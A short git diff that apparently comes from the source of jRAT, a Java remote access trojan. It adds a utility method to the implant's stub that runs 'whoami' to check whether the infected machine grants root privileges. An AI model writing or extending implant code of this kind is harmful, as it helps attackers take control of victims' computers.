@@ -1,4 +1,5 @@
 package pro.jrat.stub.utils;
+import java.io.BufferedReader;
 import java.io.File;
 import java.io.IOException;
 import java.io.InputStream;
@@ -13,6 +14,7 @@ import org.w3c.dom.Element;
 import org.w3c.dom.Node;
 import org.w3c.dom.NodeList;
 
+import pro.jrat.common.OperatingSystem;
 import pro.jrat.stub.Main;
 
 
@@ -83,5 +85,9 @@ public class Utils {
 		PrintWriter printWriter = new PrintWriter(result);
 		aThrowable.printStackTrace(printWriter);
 		return result.toString();
+	}
+	
+	public static boolean isRoot() throws Exception {
+		return OperatingSystem.getOperatingSystem() != OperatingSystem.WINDOWS && new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec("whoami").getInputStream())).readLine().equals("root");
 	}
 }
